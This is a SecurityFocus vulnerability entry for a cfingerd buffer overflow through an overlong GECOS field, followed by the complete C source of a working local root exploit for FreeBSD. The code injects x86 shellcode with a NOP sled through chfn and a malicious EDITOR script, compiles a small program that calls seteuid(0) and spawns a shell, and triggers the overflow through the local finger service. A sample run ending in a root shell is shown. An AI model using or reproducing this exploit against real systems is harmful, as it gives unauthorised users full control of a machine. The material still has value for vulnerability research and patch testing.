source: http://www.securityfocus.com/bid/651/info

Under systems that allow the user to change his GECOS field from the password file and do not limit its length cfingerd is vulnerable to a local root (or nobody) buffer overflow.
By setting a carefully designed GECOS field it is possible to execute arbitrary code with root (or nobody ) privileges. 

/*

babcia padlina ltd. cfingerd local root exploit (for FreeBSD)

RET: bfbfd7d2
PTR: bfbfd750

setting up...

Username: �����������#^�_�^_1҉V_�V_�V_�V_1�;In real life:                    
  
Home directory: �׿�Ue_(            Shell: ��@�                         
Room: �������������#^�_�^_1҉V_�V_�V_�V_1�Work phone:                         
Home phone:                         Other:                              

This user has no mail or mail spool.
Last seen Sun Sep 19 01:09 PM (CEST) from lagoon.gadaczka

uid=0(root) gid=0(wheel) groups=0(wheel)

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define BUFFER_SIZE     80
#define ADDRS           190
#define PTROFS          200
#define RETOFS          330
#define NOP             0x90
#define FILE1           "user.inf"
#define FILE2           "hack"
#define FILE3           "set"
#define FINGER          79
#define MAXLINE         1024
#define LOCALHOST       0x7f000001
#define GREEN           "\033[1;32m"
#define RED             "\033[1;31m"
#define NORM            "\033[1;39m"
#define UNBOLD          "\E[m"

long getesp(void) 
{ 
        __asm__("movl %esp,%eax\n");
}

void sh(sockfd)
int sockfd;
{
        char buf[MAXLINE];
        int c;
        fd_set rf, drugi;

        FD_ZERO(&rf);
        FD_SET(0, &rf);
        FD_SET(sockfd, &rf);

        while (1)
        {
                bzero(buf, MAXLINE);
                memcpy (&drugi, &rf, sizeof(rf));
                select(sockfd+1, &drugi, NULL, NULL, NULL);
                if (FD_ISSET(0, &drugi))
                {
                        c = read(0, buf, MAXLINE);
                        send(sockfd, buf, c, 0x4);
                }

                if (FD_ISSET(sockfd, &drugi))
                {
                        c = read(sockfd, buf, MAXLINE);
                        if (c<0) return;
                        write(1,buf,c);
                }
        }
}

int connectto(void)
{
        int sockfd;
        char sendbuf[MAXLINE];
        struct sockaddr_in cli;

        bzero(&cli, sizeof(cli));
        cli.sin_family = AF_INET;
        cli.sin_addr.s_addr=htonl(LOCALHOST);
        cli.sin_port = htons(FINGER);

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror("socket");
                return -1;
        }

        if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0) 
        {
                perror("connect");
                return -1;
        }

        sprintf(sendbuf, "%.1023s\n", getenv("LOGNAME"));
        write(sockfd, sendbuf, strlen(sendbuf));

        sleep(1);

        sprintf(sendbuf, "%.900s/%s\n", getenv("HOME"), FILE3);
        write(sockfd, sendbuf, strlen(sendbuf));

        sleep(1);

        sprintf(sendbuf, "id\n");
        write(sockfd, sendbuf, strlen(sendbuf));

        unlink(FILE3);

        fflush(stdout);
        fflush(stderr);

        sh(sockfd);

        return;
}



int main(argc, argv)
int argc;
char **argv;
{
        char *buf1 = NULL, *buf2 = NULL, *p = NULL;
        u_long *addr_ptr = NULL;
        int noplen, i, bufsize = BUFFER_SIZE, addrs = ADDRS, ptrofs = PTROFS;
        int retofs = RETOFS;
        long ret, ptr;
        FILE *phile;

        char execshell[] = 
        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
        "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
        "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
        "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

        fprintf(stderr, "\n%sbabcia padlina ltd. cfingerd local root
exploit%s%s\n\n", GREEN, NORM, UNBOLD);

        if(argc > 5)
        {
                bufsize = atoi(argv[1]);
                addrs = atoi(argv[2]);
                ptrofs = atoi(argv[3]);
                retofs = atoi(argv[4]);
        }

        if(!(buf1 = malloc(bufsize+1)))
        {
                perror("malloc()");
                return -1;
        }

        if(!(buf2 = malloc(addrs+1)))
        {
                perror("malloc()");
                return -1;
        }

        ret = getesp() + retofs;
        ptr = getesp() + ptrofs;

        noplen = bufsize - strlen(execshell);
        memset(buf1, NOP, noplen);
        strcat(buf1, execshell);

        p = buf2;
        addr_ptr = (unsigned long *)p;

        for(i = 0; i < (addrs / 4) /2; i++)
                *addr_ptr++ = ptr;

        for(i = 0; i < (addrs / 4) /2; i++)
                *addr_ptr++ = ret;

        p = (char *)addr_ptr;
        *p = '\0';

        if ((phile = fopen(FILE1, "w")) == NULL)
        {
                perror("fopen()");
                return -1;
        }

        fprintf(stderr, "%sRET: %s%x\n%sPTR: %s%x%\n\n%ssetting up...%s%s\n",
GREEN, RED, ret, GREEN, RED, ptr, GREEN, NORM, UNBOLD);

        
fprintf(phile, "#Changing user database information for %s.\n"
                "Shell: %s\n"
                "Full Name: %s\n"
                "Office Location: %s\n"
                "Office Phone: \n"
                "Home Phone: \n"
                "Other information: \n", 
                getenv("LOGNAME"), getenv("SHELL"), buf2, buf1);

        fclose(phile);

        if ((phile = fopen(FILE2, "w")) == NULL)
        {
                perror("fopen()");
                return -1;
        }

        fprintf(phile, "cat user.inf>\"$1\"\n");
        fprintf(phile, "touch -t 2510711313 \"$1\"\n");

        fclose(phile);

        sprintf(buf1, "%s.c", FILE3);

        if ((phile = fopen(buf1, "w")) == NULL)
        {
                perror("fopen()");
                return -1;
        }

        // buffer is too small to execute seteuid/setegid there, so we have
        // to do this here.

        fprintf(phile, "main() { seteuid(0); setegid(0); system(\"exec
/bin/sh\"); }");
        fclose(phile);

        sprintf(buf2, "/usr/bin/cc -o %s %s.c", FILE3, FILE3);

        system(buf2);
        unlink(buf1);

        system("EDITOR=./hack;export EDITOR;chmod +x hack;chfn > /dev/null
2>&1");
        unlink(FILE1);
        unlink(FILE2);

        if (connectto() < 0)
                return -1;

        return 0;
}